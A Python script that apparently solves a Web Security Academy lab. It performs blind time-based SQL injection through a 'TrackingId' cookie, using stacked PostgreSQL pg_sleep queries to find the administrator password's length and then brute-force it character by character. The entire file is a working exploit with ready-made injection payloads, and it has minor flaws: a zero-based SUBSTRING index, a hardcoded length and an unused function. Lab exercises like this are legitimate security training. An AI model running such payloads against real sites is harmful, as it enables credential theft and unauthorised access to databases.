import requests

url = 'https://xxx.web-security-academy.net/'



class Injection:
    def __init__(self, url):
        self.session = requests.session()
        self.url = url
        self.cookieId = self.getCookie()


    def getCookie(self): #Get value from vulnerable cookie

        self.session.get(self.url)
        return self.session.cookies.get('TrackingId')

    def getLen(self): #Get len from the MDP admin.
        for length in range(40):
            sqlPayload = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password) = {length})+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END+FROM+users--"
            cookies = {'TrackingId' : self.cookieId + sqlPayload}

            page = self.session.get(url, cookies=cookies, timeout=15)
            if page.elapsed.total_seconds() > 3:
                print('Length : ', length)
                return length


    def getMdp(self): #Brute force admin password letter by letter.

        chars = [chr(i).lower() for i in range(65, 91)] + [str(i) for i in range(0, 10)] #List of lowercase letter and number (0-9)
        length = 20

        passwd = ''

        for index in range(length):
            for char in chars:
                sqlPayload = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{index},1)='{char}')+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END+FROM+users--"
                cookies = {'TrackingId' : self.cookieId + sqlPayload}

                page = self.session.get(self.url, cookies=cookies)

                if page.elapsed.total_seconds() > 3:
                    passwd += char
                    break

        return passwd


def main():

    injection = Injection(url)
    mdp = injection.getMdp()
    print('Password : ', mdp)

if __name__ == '__main__':
    main()
